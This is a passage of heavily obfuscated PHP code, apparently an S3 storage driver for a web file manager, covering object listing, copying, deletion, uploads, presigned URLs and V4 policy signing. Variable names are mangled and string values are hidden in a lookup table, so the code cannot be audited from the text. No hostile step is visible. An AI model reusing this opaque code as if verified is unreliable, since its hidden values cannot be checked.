"\x28\60\51{$ş¿€ÎÏ}"; for ($÷Ü¶ã§² = 1; $÷Ü¶ã§² <= count($‹ûß‹é÷) + 1; $÷Ü¶ã§²++) { $İîÊÚ½Æ = $™”ÇÚìì . "\50{$÷Ü¶ã§²}\51{$ş¿€ÎÏ}"; if (!in_array_not_case($İîÊÚ½Æ, $‹ûß‹é÷)) { return $İîÊÚ½Æ; } } return $İîÊÚ½Æ; } public function listAllFiles($òšÉÈÆ÷, $òş—¹½€) { $‚¿Ò²´š =& $_SERVER[¶Ô„œ…¯]; if (empty($òş—¹½€)) { return array(); } $Ğ›¤£ôÎ = array_keys($òş—¹½€); $Öü™Ç® = array(); $òšÉÈÆ÷ = trim($òšÉÈÆ÷, $‚¿Ò²´š[8]); foreach ($òş—¹½€ as $µéöÏ÷« => $«‹Ù•Ñ) { $èÅú„Ç = ltrim(substr(trim($µéöÏ÷«, $‚¿Ò²´š[8]), strlen($òšÉÈÆ÷)), $‚¿Ò²´š[8]); if (substr($µéöÏ÷«, -1) == $‚¿Ò²´š[8]) { $èÅú„Ç = rtrim($èÅú„Ç, $‚¿Ò²´š[8]) . $‚¿Ò²´š[8]; } $Öü™Ç® = array_merge($Öü™Ç®, $this->slicePath($èÅú„Ç)); } $şşœÎŸ× = array(); foreach (array_unique($Öü™Ç®) as $·Ï¿è»é) { $ÕÌÔË” = array($‚¿Ò²´š[87] => $this->getPathOuter($‚¿Ò²´š[8] . $òšÉÈÆ÷ . $‚¿Ò²´š[8] . $·Ï¿è»é), $‚¿Ò²´š[78] => 1, $‚¿Ò²´š[79] => 0); if (substr($·Ï¿è»é, -1) != $‚¿Ò²´š[8]) { $ÕÌÔË”[$‚¿Ò²´š[78]] = 0; $Å–ÜÜ€¿ = $this->getPath($òšÉÈÆ÷ . $‚¿Ò²´š[8] . $·Ï¿è»é); if (isset($òş—¹½€[$Å–ÜÜ€¿])) { $çÏÙ = $òş—¹½€[$Å–ÜÜ€¿]; if (isset($çÏÙ[$‚¿Ò²´š[79]])) { $ÕÌÔË”[$‚¿Ò²´š[79]] = intval($çÏÙ[$‚¿Ò²´š[79]]); } if (isset($çÏÙ[$‚¿Ò²´š[206]])) { $ÕÌÔË”[$‚¿Ò²´š[88]] = intval($çÏÙ[$‚¿Ò²´š[206]]); } } } $şşœÎŸ×[] = $ÕÌÔË”; } return $şşœÎŸ×; } public function slicePath($‘æïçÜ) { $§í°Ñ›á =& $_SERVER[¶Ô„œ…¯]; $á§£şÉâ = explode($§í°Ñ›á[8], trim($‘æïçÜ, $§í°Ñ›á[8])); $Ü¾ß¼­ş = 0; do { ++$Ü¾ß¼­ş; $¡¾„¤“Ğ[] = implode($§í°Ñ›á[8], array_slice($á§£şÉâ, 0, $Ü¾ß¼­ş)) . $§í°Ñ›á[8]; } while ($Ü¾ß¼­ş < count($á§£şÉâ)); $¡¾„¤“Ğ[count($á§£şÉâ) - 1] = $‘æïçÜ; return $¡¾„¤“Ğ; } public function getHost() { $¼»·ó› =& $_SERVER[¶Ô„œ…¯]; $ğÁ¥¹¨ = parse_url(trim($this->domain, $¼»·ó›[8])); $‹´Ã³ª = isset($ğÁ¥¹¨[$¼»·ó›[207]]) ? $ğÁ¥¹¨[$¼»·ó›[207]] : http_type(); $’¸éÍ†û = isset($ğÁ¥¹¨[$¼»·ó›[208]]) ? $ğÁ¥¹¨[$¼»·ó›[208]] : $ğÁ¥¹¨[$¼»·ó›[87]]; if (isset($ğÁ¥¹¨[$¼»·ó›[209]])) { $’¸éÍ†û .= $¼»·ó›[4] . $ğÁ¥¹¨[$¼»·ó›[209]]; } return $‹´Ã³ª . $¼»·ó›[210] . $’¸éÍ†û; } public function pathEncode($ğ®Æ—¾Í) { $¡Áêòä¨ =& $_SERVER[¶Ô„œ…¯]; return str_replace($¡Áêòä¨[211], $¡Áêòä¨[8], rawurlencode($ğ®Æ—¾Í)); } public function writeLog($§ìš£Êı = '', $ª¥º¨Å• = false) { $Ø£—áØ =& $_SERVER[¶Ô„œ…¯]; $öø¡Ûñ¦ = in_array(ACTION, array($Ø£—áØ[212], $Ø£—áØ[213])); if (!$öø¡Ûñ¦ && !GLOBAL_DEBUG) { return; } $óˆ—¸ » = $§ìš£Êı; static $¢¯»ô¤Ê = null; if (!$¢¯»ô¤Ê) { $¢¯»ô¤Ê = strtoupper($this->getType()); } $§ìš£Êı = $¢¯»ô¤Ê . $Ø£—áØ[214] . $§ìš£Êı; if ($ª¥º¨Å•) { $·¶ÌñŸ = error_get_last(); if ($·¶ÌñŸ) { $§ìš£Êı = array($§ìš£Êı, $·¶ÌñŸ); } } write_log($§ìš£Êı, $Ø£—áØ[215]); if ($öø¡Ûñ¦) { throw new Exception($óˆ—¸ »); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($´ˆçÎÖÏ) { set_timeout(); require_once SDK_DIR . $_SERVER[¶Ô„œ…¯][216]; parent::__construct(); $this->_init($´ˆçÎÖÏ); } public function _init($•ĞÀÉÈ‡) { $İ´ªæšÆ =& $_SERVER[¶Ô„œ…¯]; $this->config = $•ĞÀÉÈ‡; foreach ($•ĞÀÉÈ‡ as $À¡‚èñ¼ => $´‘ÜÌğ) { if (isset($this->{$À¡‚èñ¼})) { $this->{$À¡‚èñ¼} = $´‘ÜÌğ; } } $this->endpoint = $•ĞÀÉÈ‡[$İ´ªæšÆ[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $½»òÌÎı = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($½»òÌÎı, 0, 7) == $İ´ªæšÆ[218]) { $½»òÌÎı = $İ´ªæšÆ[219] . substr($½»òÌÎı, 7); } $this->client->setEndpoint($½»òÌÎı); if (in_array(ACTION, array($İ´ªæšÆ[212], $İ´ªæšÆ[213]))) { $this->client->setExceptions(); } } public function setSignVersion($Ÿ°’ƒƒ = "\x76\64") { $this->signVer = $Ÿ°’ƒƒ; $this->client->setSignVersion($Ÿ°’ƒƒ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $êÔùŞš) { return null; } } public function isBucketCors() { $”¨Æşšé =& $_SERVER[¶Ô„œ…¯]; $ÁôíË¼ = $this->getBucketCors(); if (!$ÁôíË¼ || !is_array($ÁôíË¼)) { return !1; } if (!is_array($ÁôíË¼[$”¨Æşšé[220]])) { $ÁôíË¼[$”¨Æşšé[220]] = explode($”¨Æşšé[50], $ÁôíË¼[$”¨Æşšé[220]]); } if ($ÁôíË¼[$”¨Æşšé[221]] != $”¨Æşšé[222] || !in_array($”¨Æşšé[222], $ÁôíË¼[$”¨Æşšé[220]])) { return !1; } $Ëû‰Äïõ = array_map($”¨Æşšé[223], $ÁôíË¼[$”¨Æşšé[224]]); if (!is_array($Ëû‰Äïõ)) { $Ëû‰Äïõ = array(); } $á¦½Âµ = array($”¨Æşšé[225], $”¨Æşšé[226], $”¨Æşšé[227], $”¨Æşšé[228], $”¨Æşšé[229]); $ñ Å°Ë± = array_diff($á¦½Âµ, $Ëû‰Äïõ); return empty($ñ Å°Ë±); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($³ò÷Øİ‡, $­Òã‚ó‹ = '', $ÈÜ§šÛ = REPEAT_RENAME) { $Úƒ‹½¾À = $this->setContent($³ò÷Øİ‡, $­Òã‚ó‹); if ($Úƒ‹½¾À !== !1) { return $this->getPathOuter($³ò÷Øİ‡); } return !1; } public function mkdir($… Ö¶º›, $©§Õ¬ = REPEAT_SKIP) { $‘‘Ñ­© =& $_SERVER[¶Ô„œ…¯]; if (empty($… Ö¶º›) && $… Ö¶º› !== $‘‘Ñ­©[230]) { return !1; } if ($©§Õ¬ && $this->_isFolder($… Ö¶º›)) { return $this->getPathOuter($… Ö¶º›); } $¯é‘¥Ìş = $this->setContent($… Ö¶º›, $‘‘Ñ­©[12], !0); if ($¯é‘¥Ìş !== !1) { return $this->getPathOuter($… Ö¶º›); } return !1; } public function copyFile($•Ù¬«÷‚, $½„Š«Àø, $ëéÄ÷ÆÅ = array()) { $ÔğİÇõÀ =& $_SERVER[¶Ô„œ…¯]; $µıˆˆè´ = $this->objectMeta($•Ù¬«÷‚); if (!$µıˆˆè´) { return !1; } if ($µıˆˆè´[$ÔğİÇõÀ[79]] <= 1024 * 1024 * 200) { $³êÇË¦Ü = $this->client->copyObject($this->bucket, $•Ù¬«÷‚, $this->bucket, $½„Š«Àø, $ÔğİÇõÀ[231], $ëéÄ÷ÆÅ); } else { $³êÇË¦Ü = $this->client->multiCopyObject($this->bucket, $•Ù¬«÷‚, $this->bucket, $½„Š«Àø, $ëéÄ÷ÆÅ); } $³êÇË¦Ü = $³êÇË¦Ü ? $this->getPathOuter($½„Š«Àø) : !1; return $³êÇË¦Ü; } public function moveFile($û°ËÓŸ, $óÅŠùøÂ) { if ($this->copyFile($û°ËÓŸ, $óÅŠùøÂ)) { $this->delFile($û°ËÓŸ); return $this->getPathOuter($óÅŠùøÂ); } return !1; } public function delFile($ÑÌÄÚÇü) { return $this->client->deleteObject($this->bucket, $ÑÌÄÚÇü); } public function delFolder($Ü¦¦é­) { $Æëª¹» =& $_SERVER[¶Ô„œ…¯]; if (!$this->exist($Ü¦¦é­)) { return !0; } $this->listItemCache = !1; $ÇüŠÜÕ‚ = $this->fileList($Ü¦¦é­); $this->listItemCache = !0; $¯¡ÌŠ±° = trim($Ü¦¦é­, $Æëª¹»[8]) . $Æëª¹»[8]; if (!empty($Ü¦¦é­) && $Ü¦¦é­ !== $Æëª¹»[230] && !in_array($¯¡ÌŠ±°, $ÇüŠÜÕ‚[$Æëª¹»[85]])) { $ÇüŠÜÕ‚[$Æëª¹»[85]][] = $¯¡ÌŠ±°; } $ı§ÓÖóÈ = $this->delByBatch($ÇüŠÜÕ‚[$Æëª¹»[86]]); if (!$ı§ÓÖóÈ) { return !1; } $ı§ÓÖóÈ = $this->delByBatch($ÇüŠÜÕ‚[$Æëª¹»[85]]); if (!$ı§ÓÖóÈ) { return !1; } return $this->delFile($¯¡ÌŠ±°); } private function delByBatch($”ÓŠùÎ) { foreach (array_chunk($”ÓŠùÎ, 1000) as $•¶¾ı¨) { $ƒñÉ—Ÿ¬ = $this->client->deleteObjects($this->bucket, $•¶¾ı¨); if (!$ƒñÉ—Ÿ¬) { return !1; } } return !0; } public function rename($¹À«‡ê, $™ÉÙ÷Ë©) { return $this->renameObject($¹À«‡ê, $™ÉÙ÷Ë©); } public function listPath($¥¨ĞÂÎ‹, $¥©ëã = false) { $ÃÚş‡Ï =& $_SERVER[¶Ô„œ…¯]; $ê’ˆÈ‰İ = $this->fileList($¥¨ĞÂÎ‹, $ÃÚş‡Ï[8], !0); foreach ($ê’ˆÈ‰İ[$ÃÚş‡Ï[85]] as $½ñ‹ÒºÚ => $ù¯½Ç¹») { $ê’ˆÈ‰İ[$ÃÚş‡Ï[85]][$½ñ‹ÒºÚ] = $this->folderInfo($ù¯½Ç¹», $¥©ëã, $ù¯½Ç¹»); } foreach ($ê’ˆÈ‰İ[$ÃÚş‡Ï[86]] as $½ñ‹ÒºÚ => $ù¯½Ç¹») { $ê’ˆÈ‰İ[$ÃÚş‡Ï[86]][$½ñ‹ÒºÚ] = $this->fileInfo($ù¯½Ç¹»[$ÃÚş‡Ï[32]], $¥©ëã, $ù¯½Ç¹»); } return $ê’ˆÈ‰İ; } protected function infoChildren($÷îº¸¬­, &$Ñ—«Ì÷¦) { $¯üê¤Ë =& $_SERVER[¶Ô„œ…¯]; $ÜÉ£Æî = $this->fileList($÷îº¸¬­, $¯üê¤Ë[12], !0); $Ñ—«Ì÷¦[$¯üê¤Ë[81]] += count($ÜÉ£Æî[$¯üê¤Ë[85]]); $Ñ—«Ì÷¦[$¯üê¤Ë[80]] += count($ÜÉ£Æî[$¯üê¤Ë[86]]); foreach ($ÜÉ£Æî[$¯üê¤Ë[86]] as $ÑÓ…ß¯É) { if (!$ÑÓ…ß¯É || !$ÑÓ…ß¯É[$¯üê¤Ë[79]]) { continue; } $Ñ—«Ì÷¦[$¯üê¤Ë[79]] += $ÑÓ…ß¯É[$¯üê¤Ë[79]]; } } private function fileInfo($•Êš´£°, $ÓîÏšú = false, $¼²Îü¯ = array()) { $¬» §”œ =& $_SERVER[¶Ô„œ…¯]; $÷û¹à« = array($¬» §”œ[32] => $this->pathThis($•Êš´£°), $¬» §”œ[87] => $this->getPathOuter($•Êš´£°), $¬» §”œ[33] => $¬» §”œ[232], $¬» §”œ[169] => $this->ext($•Êš´£°), $¬» §”œ[79] => isset($¼²Îü¯[$¬» §”œ[79]]) ? $¼²Îü¯[$¬» §”œ[79]] : 0); if ($ÓîÏšú) { return $÷û¹à«; } $÷û¹à«[$¬» §”œ[233]] = $÷û¹à«[$¬» §”œ[88]] = 0; $÷û¹à«[$¬» §”œ[234]] = $÷û¹à«[$¬» §”œ[235]] = !0; if (empty($¼²Îü¯)) { $¼²Îü¯ = $this->objectMeta($•Êš´£°); if (!$¼²Îü¯) { return $÷û¹à«; } } if (isset($¼²Îü¯[$¬» §”œ[236]]) && $¼²Îü¯[$¬» §”œ[236]]) { $÷û¹à«[$¬» §”œ[237]] = $¼²Îü¯[$¬» §”œ[236]]; } if (isset($¼²Îü¯[$¬» §”œ[206]])) { $÷û¹à«[$¬» §”œ[88]] = $¼²Îü¯[$¬» §”œ[206]]; } if (isset($¼²Îü¯[$¬» §”œ[79]])) { $÷û¹à«[$¬» §”œ[79]] = $¼²Îü¯[$¬» §”œ[79]]; } return $÷û¹à«; } private function folderInfo($ûà»À±ş, $é­í­Ûª = false, $ø“å‘ùº = array()) { $¿şÔîö» =& $_SERVER[¶Ô„œ…¯]; $¹²¡âàÍ = array($¿şÔîö»[32] => $this->pathThis($ûà»À±ş), $¿şÔîö»[87] => $this->getPathOuter($¿şÔîö»[8] . $ûà»À±ş), $¿şÔîö»[33] => $¿şÔîö»[78]); if ($é­í­Ûª) { return $¹²¡âàÍ; } $¹²¡âàÍ[$¿şÔîö»[233]] = $¹²¡âàÍ[$¿şÔîö»[88]] = 0; $¹²¡âàÍ[$¿şÔîö»[234]] = $¹²¡âàÍ[$¿şÔîö»[235]] = !0; if ($ûà»À±ş == $¿şÔîö»[12]) { return $¹²¡âàÍ; } if (empty($ø“å‘ùº)) { $ø“å‘ùº = $this->objectMeta(trim($ûà»À±ş, $¿şÔîö»[8]) . $¿şÔîö»[8]); } if (isset($ø“å‘ùº[$¿şÔîö»[206]])) { $¹²¡âàÍ[$¿şÔîö»[233]] = $ø“å‘ùº[$¿şÔîö»[206]]; } return $¹²¡âàÍ; } private function fileList($ôúóù, $–ïééÊÔ = '', $æÑ¿éÅ‹ = 0) { $“¡«Èş¬ =& $_SERVER[¶Ô„œ…¯]; $è˜…“ßÙ = rtrim($ôúóù, $“¡«Èş¬[8]) . $“¡«Èş¬[8]; $îÇïÕ—å = $this->listObjs($è˜…“ßÙ, null, null, $–ïééÊÔ); if (!$îÇïÕ—å) { return array($“¡«Èş¬[85] => array(), $“¡«Èş¬[86] => array()); } $úÍæ³™Ë = $Äş“ŒâÍ = array(); foreach ($îÇïÕ—å[$“¡«Èş¬[238]] as $öóìÈóã) { $´ø•½ºä = $öóìÈóã[$“¡«Èş¬[32]]; if ($´ø•½ºä == $è˜…“ßÙ) { continue; } $µ£ÀÍ– = isset($öóìÈóã[$“¡«Èş¬[79]]) ? $öóìÈóã[$“¡«Èş¬[79]] : 0; $¯Ğç Æ = $µ£ÀÍ– == 0 && substr($´ø•½ºä, strlen($´ø•½ºä) - 1, 1) == $“¡«Èş¬[8] ? !0 : !1; $this->cacheMethodInfoSet($´ø•½ºä, $¯Ğç Æ, $öóìÈóã); if ($¯Ğç Æ) { $úÍæ³™Ë[] = $´ø•½ºä; continue; } $Äş“ŒâÍ[] = $æÑ¿éÅ‹ ? $öóìÈóã : $´ø•½ºä; } foreach ($îÇïÕ—å[$“¡«Èş¬[239]] as $öóìÈóã) { $úÍæ³™Ë[] = $öóìÈóã[$“¡«Èş¬[32]]; $this->cacheMethodInfoSet($öóìÈóã[$“¡«Èş¬[32]], !0); } $this->cacheMethodInfoSet($ôúóù, !0); return array($“¡«Èş¬[85] => $úÍæ³™Ë, $“¡«Èş¬[86] => $Äş“ŒâÍ); } private function listObjs($Ò¼²ıóü, $Èáæ·Ê¬ = null, $Š…îñğ¼ = null, $µû¿Í¸Æ = null) { $¡úÆ„õ =& $_SERVER[¶Ô„œ…¯]; $Ò¼²ıóü = trim($Ò¼²ıóü, $¡úÆ„õ[8]); $œõ‡Üı® = empty($Ò¼²ıóü) && $Ò¼²ıóü !== $¡úÆ„õ[230] ? $¡úÆ„õ[12] : $Ò¼²ıóü . $¡úÆ„õ[8]; return $this->client->getBucket($this->bucket, $œõ‡Üı®, $Èáæ·Ê¬, $Š…îñğ¼, $µû¿Í¸Æ, !0); } public function has($½ùÏ§Ÿ“, $îÛÀÉÊÛ = false, $Ñ®õ²üø = true) { $»Ì…¤Äœ =& $_SERVER[¶Ô„œ…¯]; $½ùÏ§Ÿ“ = trim($½ùÏ§Ÿ“, $»Ì…¤Äœ[8]); $™ÃÃ‡Ç‡ = empty($½ùÏ§Ÿ“) && $½ùÏ§Ÿ“ !== $»Ì…¤Äœ[230] ? $»Ì…¤Äœ[12] : $½ùÏ§Ÿ“ . $»Ì…¤Äœ[8]; $¢¸‘¢£ğ = null; $‡İõÇ´ = 500; $ï‚…Û¸ = $»Ì…¤Äœ[8]; $ÛÚ²òÇß = $¤Í–³ó² = array(); while (!0) { $–áûÀğÔ = $this->listObjs($½ùÏ§Ÿ“, $¢¸‘¢£ğ, $‡İõÇ´, $ï‚…Û¸); if (!$–áûÀğÔ) { break; } $¢¸‘¢£ğ = $–áûÀğÔ[$»Ì…¤Äœ[240]]; $Ï¾İ°áÅ = $–áûÀğÔ[$»Ì…¤Äœ[238]]; $˜ŞãëÈó = $–áûÀğÔ[$»Ì…¤Äœ[239]]; if (empty($Ï¾İ°áÅ) && empty($˜ŞãëÈó)) { break; } if (count($Ï¾İ°áÅ) == 1 && $Ï¾İ°áÅ[0][$»Ì…¤Äœ[32]] == $™ÃÃ‡Ç‡) { break; } if ($îÛÀÉÊÛ) { if (count($Ï¾İ°áÅ)) { $Ï¾İ°áÅ = array_column($Ï¾İ°áÅ, $»Ì…¤Äœ[32]); $ÛÚ²òÇß = array_merge($ÛÚ²òÇß, $Ï¾İ°áÅ); } if (count($˜ŞãëÈó)) { $˜ŞãëÈó = array_column($˜ŞãëÈó, $»Ì…¤Äœ[32]); $¤Í–³ó² = array_merge($¤Í–³ó², $˜ŞãëÈó); } if ($¢¸‘¢£ğ === null) { break; } continue; } if ($Ñ®õ²üø) { if (!empty($Ï¾İ°áÅ)) { if (count($Ï¾İ°áÅ) > 1 || isset($Ï¾İ°áÅ[0][$»Ì…¤Äœ[32]]) && $Ï¾İ°áÅ[0][$»Ì…¤Äœ[32]] != $™ÃÃ‡Ç‡) { return !0; } } } else { if (!empty($˜ŞãëÈó)) { return !0; } } if ($¢¸‘¢£ğ === null) { break; } } if ($îÛÀÉÊÛ) { $ÛÚ²òÇß = array_diff($ÛÚ²òÇß, array($™ÃÃ‡Ç‡)); $ÛÚ²òÇß = count(array_unique($ÛÚ²òÇß)); $¤Í–³ó² = count(array_unique($¤Í–³ó²)); return array($»Ì…¤Äœ[241] => $ÛÚ²òÇß, $»Ì…¤Äœ[242] => $¤Í–³ó²); } return !1; } public function listAll($Ûœ‹ó¨é) { $Øõ×Ï¦Ó =& $_SERVER[¶Ô„œ…¯]; $öŸ¥ÂÜª = $this->fileList($Ûœ‹ó¨é, $Øõ×Ï¦Ó[12], !0); $È£ÄÕ²‘ = array_to_keyvalue($öŸ¥ÂÜª[$Øõ×Ï¦Ó[86]], $Øõ×Ï¦Ó[32]); foreach ($öŸ¥ÂÜª[$Øõ×Ï¦Ó[85]] as $¦å•Ä“È) { if (is_string($¦å•Ä“È)) { $È£ÄÕ²‘[$¦å•Ä“È] = array($Øõ×Ï¦Ó[79] => 0); } } return $this->listAllFiles($Ûœ‹ó¨é, $È£ÄÕ²‘); } public function canRead($ŞûÅ²ÇÉ) { $•çâİ«ç =& $_SERVER[¶Ô„œ…¯]; $¨ÑÆëÙÅ = $this->client->getAccessControlPolicy($this->bucket, $ŞûÅ²ÇÉ); if (!$¨ÑÆëÙÅ) { return !1; } return in_array($¨ÑÆëÙÅ, array($•çâİ«ç[243], $•çâİ«ç[244], $•çâİ«ç[245])) ? !0 : !1; } public function canWrite($†½İ¥Ø¢) { $ßäà»Û =& $_SERVER[¶Ô„œ…¯]; $ŒáˆŸ‘¤ = $this->client->getAccessControlPolicy($this->bucket, $†½İ¥Ø¢); if (!$ŒáˆŸ‘¤) { return !1; } return in_array($ŒáˆŸ‘¤, array($ßäà»Û[243], $ßäà»Û[244])) ? !0 : !1; } public function getContent($Òüì¢ºû) { return $this->client->getObject($this->bucket, $Òüì¢ºû); } public function setContent($Œ¦Ö½Ö, $ÑÍƒÜˆÏ = '', $¬ÓéÍ…  = false) { $şª€Ş‰³ =& $_SERVER[¶Ô„œ…¯]; $Œ¦Ö½Ö = $¬ÓéÍ…  ? trim($Œ¦Ö½Ö, $şª€Ş‰³[8]) . $şª€Ş‰³[8] : $Œ¦Ö½Ö; $ ÚºÁŒ = get_file_mime(get_path_ext($Œ¦Ö½Ö)); $•Š´„¨ï = $this->client->putObject($ÑÍƒÜˆÏ, $this->bucket, $Œ¦Ö½Ö, $şª€Ş‰³[231], array(), $ ÚºÁŒ); if (!$•Š´„¨ï) { return !1; } if ($¬ÓéÍ… ) { return !0; } return $•Š´„¨ï ? !0 : !1; } public function fileSubstr($¤ğîÙë×, $óïÄáî, $Ş›×”ê¿) { $¤ã¼î“ = $óïÄáî + $Ş›×”ê¿ - 1; return $this->client->getObject($this->bucket, $¤ğîÙë×, array($_SERVER[¶Ô„œ…¯][246] => "\142\x79\164\145\x73\75{$óïÄáî}\x2d{$¤ã¼î“}")); } public function upload($©ğ¥å, $âùÆÑ÷‹, $™›ËúùÎ = false, $Ï„û–­ = REPEAT_REPLACE) { $²³ì¶Ô =& $_SERVER[¶Ô„œ…¯]; $ßÀõˆµ› = array($²³ì¶Ô[247] => @md5_file($âùÆÑ÷‹)); $×¢Ì®ğ = array($²³ì¶Ô[248] => get_file_mime(get_path_ext($©ğ¥å))); if (IO::size($âùÆÑ÷‹) <= 1024 * 1024 * 200) { $ØÃ»§„ = $this->client->putObjectFile($âùÆÑ÷‹, $this->bucket, $©ğ¥å, $²³ì¶Ô[231], $ßÀõˆµ›, $×¢Ì®ğ); return !empty($ØÃ»§„) ? $this->getPathOuter($©ğ¥å) : !1; } $ä™Á¾ÙÑ = $this->client->multiUploadObject($âùÆÑ÷‹, $this->bucket, trim($©ğ¥å, $²³ì¶Ô[8]), $ßÀõˆµ›, $×¢Ì®ğ); return $ä™Á¾ÙÑ ? $this->getPathOuter($©ğ¥å) : !1; } public function download($ÀÕ³ğË¤, $õô¦Î±ß) { if (!@is_dir($this->pathFather($õô¦Î±ß)) && !IO::mkdir($this->pathFather($õô¦Î±ß))) { return !1; } $ï½–É©‰ = $this->client->getObject($this->bucket, $ÀÕ³ğË¤, array(), $õô¦Î±ß); return $ï½–É©‰ !== !1 ? $õô¦Î±ß : !1; } public function link($—äæÃëÈ, $£ñ¸µŠ = array()) { return $this->getPreSignedURL($—äæÃëÈ, 3600 * 12, $£ñ¸µŠ); } private function getPreSignedURL($ˆê›‡—´, $¨ùÀ¯Ú¹, $—Æ´çÓ¹ = array(), $©õÀ“Ñş = "\107\x45\x54") { $®„ùÇ¦„ =& $_SERVER[¶Ô„œ…¯]; $ˆê›‡—´ = trim($ˆê›‡—´, $®„ùÇ¦„[8]); if ($this->signVer == $®„ùÇ¦„[249]) { return $this->client->getPreSignedV2URL($this->bucket, $ˆê›‡—´, $¨ùÀ¯Ú¹, $©õÀ“Ñş, $—Æ´çÓ¹); } return $this->client->getPreSignedV4URL($this->bucket, $ˆê›‡—´, $¨ùÀ¯Ú¹, array(), $©õÀ“Ñş, $—Æ´çÓ¹); } public function fileOut($ Â’’¹¾, $ß’Å‚ = false, $ô®µÕÁĞ = false, $‡ù± àè = '') { $À·ÃŠÔî =& $_SERVER[¶Ô„œ…¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($ Â’’¹¾, $ß’Å‚, $ô®µÕÁĞ, $‡ù± àè); } if (!$ô®µÕÁĞ) { $ô®µÕÁĞ = $this->pathThis($ Â’’¹¾); } $ÑÒşåÔ = get_file_mime(get_path_ext($ô®µÕÁĞ)); if ($ÑÒşåÔ == $À·ÃŠÔî[250]) { return parent::fileOut($ Â’’¹¾, $ß’Å‚, $ô®µÕÁĞ, $‡ù± àè); } $‘ûôƒÎØ = array($À·ÃŠÔî[251] => $ÑÒşåÔ); if ($ß’Å‚) { $‘ûôƒÎØ[$À·ÃŠÔî[252]] = $À·ÃŠÔî[253] . rawurlencode($ô®µÕÁĞ); } else { } $ÚË¶èóø = $this->link($ Â’’¹¾, $‘ûôƒÎØ); $this->fileOutLink($ÚË¶èóø); } public function fileOutServer($á¸Íçş•, $¡ŸÑ˜÷ = false, $©²à¯¶Ä = false, $ÅÖ¥¥À  = '') { parent::fileOut($á¸Íçş•, $¡ŸÑ˜÷, $©²à¯¶Ä, $ÅÖ¥¥À ); } public function fileOutImageServer($ìÇº‘•˜, $…ˆ¢çœ‘ = 250) { parent::fileOutImage($ìÇº‘•˜, $…ˆ¢çœ‘); } public function hashMd5($ä§©ÂœÏ, $«‚“²Ï½ = '') { $ª€“¹¨• = $this->objectMeta($ä§©ÂœÏ); if (!$ª€“¹¨•) { return !1; } $«‚“²Ï½ = $«‚“²Ï½ ? $«‚“²Ï½ : _get($ª€“¹¨•, $_SERVER[¶Ô„œ…¯][254]); return $«‚“²Ï½; } public function uploadFormData($”ƒüë¿, $ªïàÚ å = 3600) { $À‚ĞåÖ  =& $_SERVER[¶Ô„œ…¯]; if (!$this->_isClientAsync()) { $ûÃæô¥‡ = $this->getPreSignedURL($”ƒüë¿, $ªïàÚ å, array(), $À‚ĞåÖ [255]); return array($À‚ĞåÖ [208] => str_replace($À‚ĞåÖ [218], $À‚ĞåÖ [256], $ûÃæô¥‡)); } if (isset($GLOBALS[$À‚ĞåÖ [6]][$À‚ĞåÖ [92]][$À‚ĞåÖ [257]]) && $GLOBALS[$À‚ĞåÖ [6]][$À‚ĞåÖ [92]][$À‚ĞåÖ [257]] == $À‚ĞåÖ [230]) { return $this->uploadMultiData($”ƒüë¿, $ªïàÚ å); } if ($this->signVer == $À‚ĞåÖ [249]) { return $this->uploadFormDataV2($”ƒüë¿, $ªïàÚ å); } return $this->uploadFormDataV4($”ƒüë¿, $ªïàÚ å); } private function uploadFormDataV2($×Ş¤Šáõ, $¹ä‘¿èƒ = 3600) { $¯êÕ¹­Œ =& $_SERVER[¶Ô„œ…¯]; $ßÉ½˜Ä = $this->pathFather($×Ş¤Šáõ); $æãà¬©˜ = $this->client->getHttpUploadPostParams($this->bucket, $ßÉ½˜Ä, $¯êÕ¹­Œ[231], $¹ä‘¿èƒ); $‰í¨ô‘ = array_merge((array) $æãà¬©˜, array($¯êÕ¹­Œ[258] => $¯êÕ¹­Œ[249], $¯êÕ¹­Œ[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($‰í¨ô‘[$¯êÕ¹­Œ[258]]); } return $‰í¨ô‘; } private function uploadFormDataV4($—õ¶ãÏª, $•ØÄ­—¾ = 3600) { $İòŸÉä =& $_SERVER[¶Ô„œ…¯]; $Ô¨„¨ÑÜ = $İòŸÉä[231]; $‰šò©ĞŒ = $İòŸÉä[259]; $¤óŒŒ‘ = $İòŸÉä[62]; $ãâŠè« = gmdate($İòŸÉä[260]); $›íÎŸª™ = gmdate($İòŸÉä[261]); $Ş…’Îóª = $İòŸÉä[262]; $ù½˜–ÈÖ = $•ØÄ­—¾ . $İòŸÉä[12]; $µ‘İøÕ = $İòŸÉä[263]; $ãæˆÏ‹¢ = array($this->accessKey, $›íÎŸª™, $this->region, $¤óŒŒ‘, $Ş…’Îóª); $•ÛÀ†¡æ = implode($İòŸÉä[8], $ãæˆÏ‹¢); $í–ŸşÊÈ = array($İòŸÉä[264] => gmdate($İòŸÉä[265], strtotime($İòŸÉä[266])), $İòŸÉä[267] => array(array($İòŸÉä[268] => $this->bucket), array($İòŸÉä[269], $İòŸÉä[270], $İòŸÉä[12]), array($İòŸÉä[269], $İòŸÉä[271], $İòŸÉä[12]), array($İòŸÉä[272] => $µ‘İøÕ), array($İòŸÉä[273] => $•ÛÀ†¡æ), array($İòŸÉä[274] => $‰šò©ĞŒ), array($İòŸÉä[275] => $ãâŠè«), array($İòŸÉä[276] => $ù½˜–ÈÖ))); $‰øĞµ™ = base64_encode(json_encode($í–ŸşÊÈ)); $ì·¨î¬¡ = hash_hmac($İòŸÉä[277], $›íÎŸª™, $İòŸÉä[278] . $this->secret, !0); $ÜëÆš¬˜ = hash_hmac($İòŸÉä[277], $this->region, $ì·¨î¬¡, !0); $Ñ«‹ÈûÓ = hash_hmac($İòŸÉä[277], $¤óŒŒ‘, $ÜëÆš¬˜, !0); $¹æ´îôÇ = hash_hmac($İòŸÉä[277], $Ş…’Îóª, $Ñ«‹ÈûÓ, !0); $Ç¼ïÀñœ = hash_hmac($İòŸÉä[277], $‰øĞµ™, $¹æ´îôÇ); 